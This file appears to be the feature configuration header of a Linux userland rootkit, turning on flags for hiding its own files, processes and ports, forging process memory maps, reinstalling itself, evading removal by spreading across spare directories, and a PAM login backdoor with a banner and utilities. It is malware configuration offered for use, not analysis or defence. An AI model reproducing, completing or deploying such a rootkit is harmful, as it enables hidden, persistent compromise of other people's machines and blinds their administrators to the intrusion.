#define USE_PAM_BD

#define HIDE_SELF // hide all rootkit paths & procs.
#define FORGE_MAPS // hide rootkit location from process mem map files.
#define HIDE_PORTS // hide hidden ports specified from a file.
#define DO_REINSTALL // make sure the rootkit stays installed.

// if the rootkit's installation directory is removed for whatever reason the
// rootkit will instead use one out of a handful of other directories we have
// installed to.
#define DO_EVASIONS

#define BACKDOOR_ROLF // shows banner on backdoor login
#define BACKDOOR_UTIL // allows access to a host of backdoor utils.
#define SET_MAGIC_ENV_UNHIDE // set the rootkit's magic environment variable when doing `./bdv unhideself`
#define BACKDOOR_PKGMAN // allows access to certain package managers without ruining the box.

#undef LINK_IF_ERR
#define USE_CRYPT

/* everything past here is setup.py */
